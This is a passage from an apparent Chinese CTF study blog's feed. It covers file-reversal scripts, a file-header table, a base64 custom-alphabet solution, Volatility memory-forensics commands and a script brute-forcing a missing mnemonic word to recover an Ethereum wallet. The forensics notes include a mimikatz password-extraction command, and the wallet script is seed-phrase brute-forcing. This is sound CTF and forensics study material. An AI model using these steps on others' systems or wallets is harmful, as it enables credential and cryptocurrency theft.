open(r&#x27;D:\网站下载\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\网站下载\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\网站下载\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\网站下载\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c-408562.png" alt="1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png"></p><p><font style="color:#DF2A3F;">导入十六进制，保存，修改后缀名为jpg，</font><font style="color:rgb(77, 77, 77);">（文件→导入十六进制→保存→重命名为flag.jpg)</font></p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b-241751.png" alt="1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png"></p><p>得到照片</p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc-573228.jpeg" alt="1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg"></p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252-017142.png" alt="1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png"></p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a-091720.png" alt="1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png"></p><p>打开就可以看到啦</p><h2 id="补充exp"><a href="#补充exp" class="headerlink" title="补充exp"></a>补充exp</h2><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1727076597060-900372ab-0cf0-4eac-87cc-4278854bdba2-750880.png" alt="1727076597060-900372ab-0cf0-4eac-87cc-4278854bdba2.png"></p><p>其实直接逆序就行，但是糖了，没想到一个字节是两个十六进制表示，唐了</p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1727076858646-3d55fa0b-1688-46e2-acab-fc6f182ad04f-833017.png" alt="1727076858646-3d55fa0b-1688-46e2-acab-fc6f182ad04f.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">input=open(&#x27;文件地址&#x27;,&#x27;rb&#x27;)<br>input_all=input.read()<br>ss=input_all[::-1]<br>output=open(&#x27;输出文件地址&#x27;,&#x27;wb&#x27;)<br>output.write(ss)<br>input.close()<br>output.close()<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);"></font></p><blockquote><p>更新: 2024-10-18 11:52:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/bmpatlf8723vp4o6">https://www.yuque.com/chaye-apqbl/vsc85q/bmpatlf8723vp4o6</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h1><h1 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h1><p><img src="/./img/49277317_DU8YE8lsz0wfgYso/1721533567453-70a75712-5447-4340-8142-c92303b62ae4-964291.png" alt="1721533567453-70a75712-5447-4340-8142-c92303b62ae4.png"></p><p><img src="/./img/49277317_DU8YE8lsz0wfgYso/1721533595817-1a97c322-e2c9-4294-bcaf-28ec0734838e-200650.png" alt="1721533595817-1a97c322-e2c9-4294-bcaf-28ec0734838e.png"></p><h1 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">aJPEG(jpg)       　    文件头：FFD8FF　　　　　　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br>PNG(png)             `文件头：89504E47　　　　　　 文件尾：AE 42 60 82<br><br>GIF(gif)              文件头：47494638　　　  　　文件尾：00 3B<br><br>ZIP(zip)              文件头：504B0304　　        文件尾：50 4B<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs plain">JPEG (jpg)，<br>文件头：FFD8FF　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br>PNG (png)， 　　<br>文件头：89504E47　 文件尾：AE 42 60 82<br><br>GIF (gif)， 　　<br>文件头：47494638　 文件尾：00 3B<br><br>ZIP Archive (zip)，<br>文件头：504B0304　　 文件尾：50 4B<br><br>TIFF (tif)， 　<br>文件头：49492A00<br><br>Windows Bitmap (bmp)， 　<br>文件头：424D<br>　　　　　　<br>CAD (dwg)， 　<br>文件头：41433130　<br>　　　　　　　　　　　　　　　　　　　　　<br>Adobe Photoshop (psd)，<br>文件头：38425053　<br>　　　　　　　　　　　　　　　　　　　　　<br>Rich Text Format (rtf)，<br>文件头：7B5C727466　<br>　　　　　　　　　　　　　　　　　　　<br>XML (xml)，<br>文件头：3C3F786D6C　<br>　　　　　　　　　　　　　　　　　　　<br>HTML (html)，<br>文件头：68746D6C3E<br><br>Email [thorough only] (eml)，<br>文件头：44656C69766572792D646174653A<br><br>Outlook Express (dbx)，<br>文件头：CFAD12FEC5FD746F<br>Outlook (pst)，<br>文件头：2142444E<br><br>MS Word/Excel (xls.or.doc)，<br>文件头：D0CF11E0<br><br>MS Access (mdb)，<br>文件头：5374616E64617264204A<br><br>WordPerfect (wpd)，<br>文件头：FF575043<br><br>Adobe Acrobat (pdf)，<br>文件头：255044462D312E<br><br>Quicken (qdf)，<br>文件头：AC9EBD8F<br><br>Windows Password (pwl)，<br>文件头：E3828596<br><br>RAR Archive (rar)，<br>文件头：52617221<br><br>Wave (wav)， 文件头：57415645<br>AVI (avi)， 文件头：41564920<br>Real Audio (ram)， 文件头：2E7261FD<br>Real Media (rm)， 文件头：2E524D46<br>MPEG (mpg)， 文件头：000001BA<br>MPEG (mpg)， 文件头：000001B3<br>Quicktime (mov)， 文件头：6D6F6F76<br>Windows Media (asf)， 文件头：3026B2758E66CF11<br>MIDI (mid)， 文件头：4D546864<br><br>7z 文件头：37 7A BC AF 27 1C<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-03-25 20:59:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dypekn2am6v0afzl">https://www.yuque.com/chaye-apqbl/vsc85q/dypekn2am6v0afzl</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/unicode/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/unicode/</url>
    
    <content type="html"><![CDATA[<h1 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h1><p><img src="/./img/LuFh2-IjntOzk4Jd/1728369461273-0d0d1696-9d00-476e-be96-058111540cff-219963.png" alt="1728369461273-0d0d1696-9d00-476e-be96-058111540cff.png"></p><blockquote><p>更新: 2024-10-08 14:37:51<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ounbgzzigw9nineo">https://www.yuque.com/chaye-apqbl/vsc85q/ounbgzzigw9nineo</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/index/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/index/</url>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><blockquote><p>更新: 2024-11-13 14:53:39<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/co05a6dg4gzr0xt4">https://www.yuque.com/chaye-apqbl/vsc85q/co05a6dg4gzr0xt4</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/base64%E6%8D%A2%E8%A1%A8/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/base64%E6%8D%A2%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="base64换表"><a href="#base64换表" class="headerlink" title="base64换表"></a>base64换表</h1><h1 id="1、nssctf-1998"><a href="#1、nssctf-1998" class="headerlink" title="1、nssctf 1998"></a>1、nssctf 1998</h1><p>找到明文，看到different，猜测应该是base64换表<img src="/./img/49277317_kHCAGZvtNrYEFUck/1721458045071-acf75018-b67c-49a1-a807-e7481d94608e-737139.png" alt="1721458045071-acf75018-b67c-49a1-a807-e7481d94608e.png">先找到原来的base64表，这里注意他string里面只有63位，然后自己再仔细找一下，上面还藏了一个字母A</p><p><img src="/./img/49277317_kHCAGZvtNrYEFUck/1721457964923-73051a66-a952-457e-99f3-99f9f049fbda-162323.png" alt="1721457964923-73051a66-a952-457e-99f3-99f9f049fbda.png"></p><p>根据他的换表方法得到base64change表</p><p>看右边有个lookatme函数就是base的change方法</p><p><img src="/./img/49277317_kHCAGZvtNrYEFUck/1721457923212-bf1883ed-9e50-45e2-a1fc-ce7b3735d3ae-039609.png" alt="1721457923212-bf1883ed-9e50-45e2-a1fc-ce7b3735d3ae.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">__int64 changebease64()<br>&#123;<br>  __int64 result; // rax<br>  char v1; // [rsp+1h] [rbp-5h]<br>  int i; // [rsp+2h] [rbp-4h]<br><br>  for ( i = 0; i &lt;= 9; ++i )<br>  &#123;<br>    v1 = base64_table[i];<br>    base64_table[i] = base64_table[19 - i];<br>    result = 19 - i;<br>    base64_table[result] = v1;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = list(&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;)<br><br>for i in range(10):<br>    v1 = a[i]<br>    a[i] = a[19 - i]<br>    a[19 - i] = v1<br><br>print(&#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure><p>得到change表</p><p>TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;</p><p>然后拿去解密即可得到flag</p><p><img src="/./img/49277317_kHCAGZvtNrYEFUck/1721458706762-0df35c3d-9855-4b00-8cb4-2e1666e089ed-435549.png" alt="1721458706762-0df35c3d-9855-4b00-8cb4-2e1666e089ed.png"></p><blockquote><p>更新: 2024-07-20 15:23:26<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ex2ofwgl8fxhd5fm">https://www.yuque.com/chaye-apqbl/vsc85q/ex2ofwgl8fxhd5fm</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%8F%96%E8%AF%81/%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81/"/>
    <url>/2026/01/19/MISC/%E5%8F%96%E8%AF%81/%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="磁盘取证"><a href="#磁盘取证" class="headerlink" title="磁盘取证"></a>磁盘取证</h1><blockquote><p>更新: 2024-11-30 13:32:09<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/yutc1o3e9e86r3k2">https://www.yuque.com/chaye-apqbl/vsc85q/yutc1o3e9e86r3k2</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%8F%96%E8%AF%81/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <url>/2026/01/19/MISC/%E5%8F%96%E8%AF%81/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><h1 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h1><p><a href="https://blog.csdn.net/m0_68012373/article/details/127419463">https://blog.csdn.net/m0_68012373&#x2F;article&#x2F;details&#x2F;127419463</a></p><p><a href="https://blog.csdn.net/zjjcxy_long/article/details/108315214">https://blog.csdn.net/zjjcxy_long&#x2F;article&#x2F;details&#x2F;108315214</a></p><h2 id="vol2"><a href="#vol2" class="headerlink" title="vol2"></a>vol2</h2><p>与python对应</p><p><a href="https://github.com/volatilityfoundation/volatility.git">https://github.com/volatilityfoundation/volatility.git</a></p><ol><li>git clone之后cd volatility</li><li>sudo python2 setup.py install</li><li>pip2 install  pycryptodome</li><li>pip2 install distorm3</li></ol><p>vol.py -f 1.raw imageinfo#获取镜像详细信息</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 pslist#查看进程</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 psscan#查看进程且能检测到隐藏或者解链的进程</p><p>#提取进程</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 memdump -n iexplore.exe -D .&#x2F;#导出为dmp</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 procdump -n iexplore.exe -D .&#x2F;#导出为exe</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 dlldump -n iexplore.exe -D .&#x2F;#将进程的所有dll导出</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 dumpregistry -D .&#x2F;#提取注册表数据</p><p>vol.py –plugins volatility&#x2F;plugins&#x2F; -f 1.raw –profile&#x3D;Win7SP1x64 mimikatz#获取密码，也可能是clipboard</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 iehistory#查看浏览器历史记录</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP0x64 dumpfiles -Q 0x000000001e742dd0 -D .&#x2F;#根据编号提取文件</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 envars | grep ‘FLAG’#查看环境变量</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 hivelist#查看当前内存中装载的注册表</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 hivedump -o 0xfffff8a00148a420 #dump某个内存地址中的注册表</p><p>cat mem.vmem | strings | grep “flag”#查找字符串flag</p><blockquote><p>更新: 2024-11-30 13:33:50<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/pzhoug2tedkuoeoc">https://www.yuque.com/chaye-apqbl/vsc85q/pzhoug2tedkuoeoc</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%8F%96%E8%AF%81/raw%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <url>/2026/01/19/MISC/%E5%8F%96%E8%AF%81/raw%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="raw内存取证"><a href="#raw内存取证" class="headerlink" title="raw内存取证"></a>raw内存取证</h1><h1 id="volatility内存镜像取证-raw取证-CSDN博客"><a href="#volatility内存镜像取证-raw取证-CSDN博客" class="headerlink" title="volatility内存镜像取证_raw取证-CSDN博客"></a><a href="https://blog.csdn.net/qq_51999772/article/details/122507511">volatility内存镜像取证_raw取证-CSDN博客</a></h1><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a><font style="color:rgb(51, 51, 51);">概念</font></h1><p><a href="https://baike.baidu.com/item/RAW/218261?fr=aladdin">RAW（图像文件）_百度百科 (baidu.com)</a></p><p><strong><font style="color:rgb(51, 51, 51);">原始图像文件</font></strong><font style="color:rgb(51, 51, 51);">包含从</font><a href="https://baike.baidu.com/item/%E6%95%B0%E7%A0%81%E7%9B%B8%E6%9C%BA/277472?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">数码相机</font></a><font style="color:rgb(51, 51, 51);">、</font><a href="https://baike.baidu.com/item/%E6%89%AB%E6%8F%8F%E5%99%A8/0?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">扫描器</font></a><font style="color:rgb(51, 51, 51);">或</font><a href="https://baike.baidu.com/item/%E7%94%B5%E5%BD%B1%E8%83%B6%E7%89%87/4034648?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">电影胶片</font></a><font style="color:rgb(51, 51, 51);">扫描仪的图像传感器所处理数据。之所以这样命名，是因为他们尚未被处理，未被</font><a href="https://baike.baidu.com/item/%E6%89%93%E5%8D%B0/0?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">打印</font></a><font style="color:rgb(51, 51, 51);">或用于编辑。通常情况下，原始图像有宽色</font><a href="https://baike.baidu.com/item/%E5%9F%9F/0?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">域</font></a><font style="color:rgb(51, 51, 51);">的内部色彩，可以进行精确的调整，可以在转换之前作出一些简单修改，如TIFF或</font><a href="https://baike.baidu.com/item/JPEG/0?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">JPEG</font></a><font style="color:rgb(51, 51, 51);">文件格式存储。方便打印，或进一步的处理。这些编码往往依赖于色彩图像的设备。这些图像常常被形容为</font><em><font style="color:rgb(51, 51, 51);">“RAW</font></em><font style="color:rgb(51, 51, 51);"> 图像文件”，虽然实际上不是指单一的原始文件格式。其实有几十种不同型号的数码设备在使用这种格式（常见于数码相机或胶片扫描仪）。 原始图像文件，有时也被称为</font><strong><font style="color:rgb(51, 51, 51);">数字底片</font></strong><font style="color:rgb(51, 51, 51);">，因为它们充当与电影底片相同的角色，并不是作为图像直接使用，而是创建一个包含所有信息的图像。同样，转换成可视格式原始图像文件的过程中，有时也被称为渲染原始图像，相当于电影发展过程中用于</font><a href="https://baike.baidu.com/item/%E6%84%9F%E5%85%89%E8%83%B6%E7%89%87/0?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">感光胶片</font></a><font style="color:rgb(51, 51, 51);">转换成可视图像的比喻。图像渲染是白平衡和色彩分级的过程中的一部分。</font></p><p><font style="color:rgb(51, 51, 51);"></font></p><p><a href="https://blog.csdn.net/yingzinanfei/article/details/53165294">volatility安装及使用_windows 安装 volatility3-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_51999772/article/details/122507511">volatility内存镜像取证_raw取证-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ez-Forensics"><a href="#ez-Forensics" class="headerlink" title="ez_Forensics"></a><strong>ez_Forensics</strong></h2><p><a href="https://blog.csdn.net/qq_51999772/article/details/122507511">volatility内存镜像取证_raw取证-CSDN博客</a></p><blockquote><p>更新: 2024-09-25 13:40:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ou1sqfzsphuhhlod">https://www.yuque.com/chaye-apqbl/vsc85q/ou1sqfzsphuhhlod</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%8F%96%E8%AF%81/index/"/>
    <url>/2026/01/19/MISC/%E5%8F%96%E8%AF%81/index/</url>
    
    <content type="html"><![CDATA[<h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><blockquote><p>更新: 2024-09-25 13:31:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/oa17tz4erfshct1p">https://www.yuque.com/chaye-apqbl/vsc85q/oa17tz4erfshct1p</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BE%8B%E9%A2%98/"/>
    <url>/2026/01/19/MISC/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BE%8B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="2025浙江省省赛初赛"><a href="#2025浙江省省赛初赛" class="headerlink" title="2025浙江省省赛初赛"></a>2025浙江省省赛初赛</h2><h3 id="RecoverWallet（复现）"><a href="#RecoverWallet（复现）" class="headerlink" title="RecoverWallet（复现）"></a>RecoverWallet（复现）</h3><p> ![[task.txt]]<br> Mnemonic: ankle assume estate permit (???) eye fancy spring demand dial awkward hole<br>Ethereum Address: 0x**********************************700f80</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from eth_account import Account  <br>from mnemonic import Mnemonic  <br>  <br>parts = <span class="hljs-selector-attr">[<span class="hljs-string">&quot;ankle&quot;</span>,<span class="hljs-string">&quot;assume&quot;</span>,<span class="hljs-string">&quot;estate&quot;</span>,<span class="hljs-string">&quot;permit&quot;</span>, None, <span class="hljs-string">&quot;eye&quot;</span>,<span class="hljs-string">&quot;fancy&quot;</span>,<span class="hljs-string">&quot;spring&quot;</span>,<span class="hljs-string">&quot;demand&quot;</span>,<span class="hljs-string">&quot;dial&quot;</span>,<span class="hljs-string">&quot;awkward&quot;</span>,<span class="hljs-string">&quot;hole&quot;</span>]</span>  <br>mnemo = <span class="hljs-built_in">Mnemonic</span>(<span class="hljs-string">&quot;english&quot;</span>)  <br>wordlist = mnemo<span class="hljs-selector-class">.wordlist</span>  <br>assert <span class="hljs-built_in">len</span>(wordlist) == <span class="hljs-number">2048</span>  <br>  <br>candidates = <span class="hljs-selector-attr">[]</span>  <br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> wordlist:  <br>    candidate = parts<span class="hljs-selector-class">.copy</span>()  <br>    candidate<span class="hljs-selector-attr">[4]</span> = w  <br>    phrase = <span class="hljs-string">&quot; &quot;</span><span class="hljs-selector-class">.join</span>(candidate)  <br>    <span class="hljs-keyword">if</span> mnemo<span class="hljs-selector-class">.check</span>(phrase):  <br>        candidates<span class="hljs-selector-class">.append</span>(phrase)  <br>  <br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(len(candidates)</span></span>, <span class="hljs-string">&quot;candidates found.&quot;</span>)  <br>  <br>  <br>Account<span class="hljs-selector-class">.enable_unaudited_hdwallet_features</span>()  <br><span class="hljs-keyword">for</span> phrase <span class="hljs-keyword">in</span> candidates:  <br>    acct = Account<span class="hljs-selector-class">.from_mnemonic</span>(phrase, account_path=<span class="hljs-string">&quot;m/44&#x27;/60&#x27;/0&#x27;/0/0&quot;</span>)  <br>    addr = acct<span class="hljs-selector-class">.address</span>  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;phrase:&quot;</span>, phrase)  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;address:&quot;</span>, addr)  <br>  <br>    <span class="hljs-keyword">if</span> addr<span class="hljs-selector-class">.lower</span>()<span class="hljs-selector-class">.endswith</span>(<span class="hljs-string">&quot;700f80&quot;</span>):  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;address found:&quot;</span>, addr)  <br>        break<br></code></pre></td></tr></table></figure><p>![[Pasted image 20251119155848.png]]</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/%E6%B8%B8%E6%88%8F%E9%A2%98/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
    
